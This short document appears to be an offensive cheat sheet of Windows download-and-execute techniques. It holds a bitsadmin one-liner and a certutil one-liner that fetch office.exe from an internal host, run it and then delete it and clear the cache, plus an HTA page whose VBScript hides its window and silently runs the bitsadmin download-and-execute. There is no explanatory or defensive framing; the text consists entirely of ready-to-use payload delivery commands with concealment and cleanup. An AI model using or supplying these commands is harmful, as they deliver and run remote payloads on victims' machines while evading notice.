  • bitsadmin

bitsadmin /transfer office http://192.168.1.19:81/office.exe c:\office.exe & c:\office.exe

HTA：

<html><head><script language="VBScript">Sub window_onload    window.resizeTo 0,0    window.MoveTo -100,-100  const impersonation = 3  Const HIDDEN_WINDOW = 12  Set Locator = CreateObject("WScript.Shell")    Locator.Run "cmd.exe /c bitsadmin /transfer office http://192.168.1.19:81/office.exe c:\office.exe & c:\office.exe",vbhide  Locator.Run "cmd.exe /c bitsadmin /setpriority office foreground",vbhide    window.close()end sub</script></head></html>

  • certutil

certutil -urlcache -split -f http://192.168.1.19:81/office.exe office.exe && office.exe && del office.exe && certutil -urlcache -split -f http://192.168.1.19:81/office.exe delete
